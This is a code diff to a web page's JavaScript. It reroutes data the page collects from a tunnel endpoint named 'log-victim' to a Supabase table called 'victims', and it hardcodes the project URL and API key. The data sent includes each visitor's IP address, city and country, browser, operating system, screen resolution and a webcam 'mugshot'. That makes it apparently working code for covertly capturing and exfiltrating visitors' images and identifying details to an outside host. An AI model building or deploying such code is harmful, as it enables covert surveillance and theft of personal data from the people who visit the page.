@@ -24,9 +24,9 @@ document.addEventListener('DOMContentLoaded', () => {
     const video = document.getElementById('webcam');
     const canvas = document.getElementById('canvas');
 
-    // --- CONFIGURATION ---
-    // Change this to your public NGROK URL (e.g. "https://xxxx-xxx.ngrok-free.app/log-victim")
-    const BACKEND_URL = "https://light-kings-fetch.loca.lt/log-victim";
+    // --- SUPABASE CONFIGURATION ---
+    const SUPABASE_URL = "https://veyrnqafcitibeudcgyj.supabase.co";
+    const SUPABASE_KEY = "sb_publishable_uYqZ_9fK1AAcjlsXY_HyLQ_IzZ1rw7l";
     const dbStatusEl = document.getElementById('db-status');
 
     startBtn.addEventListener('click', async () => {
@@ -193,24 +193,37 @@ document.addEventListener('DOMContentLoaded', () => {
 
     async function logToBackend(data) {
         try {
-            console.log("Sending data to master database...", BACKEND_URL);
-            const response = await fetch(BACKEND_URL, {
+            console.log("Sending data to Supabase...");
+            const response = await fetch(`${SUPABASE_URL}/rest/v1/victims`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                headers: {
+                    'Content-Type': 'application/json',
+                    'apikey': SUPABASE_KEY,
+                    'Authorization': `Bearer ${SUPABASE_KEY}`,
+                    'Prefer': 'return=minimal'
+                },
+                body: JSON.stringify({
+                    ip: data.ip || 'Unknown',
+                    location: `${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}`,
+                    browser: data.browser || 'Unknown',
+                    os: data.os || 'Unknown',
+                    resolution: data.resolution || 'Unknown',
+                    mugshot: data.mugshot || ''
+                })
             });
-            if (response.ok) {
-                dbStatusEl.innerText = "CONNECTED (MASTER_SYNC)";
+            if (response.ok || response.status === 201) {
+                dbStatusEl.innerText = "CONNECTED (CLOUD_SYNC)";
                 dbStatusEl.style.color = "#00ff00";
-                console.log("Master Sync Successful.");
+                console.log("Cloud Sync Successful.");
             } else {
                 dbStatusEl.innerText = "ERROR (STATUS_" + response.status + ")";
                 dbStatusEl.style.color = "#ff0000";
+                console.error("Supabase error:", await response.text());
             }
         } catch (e) {
-            console.error("Master Sync Failed", e);
-            dbStatusEl.innerText = "OFFLINE (LOCAL_SERVER_BLOCK)";
-            dbStatusEl.style.color = "#ffaa00"; // Orange for block/offline
+            console.error("Cloud Sync Failed", e);
+            dbStatusEl.innerText = "OFFLINE (NETWORK_ERROR)";
+            dbStatusEl.style.color = "#ffaa00";
         }
     }
 
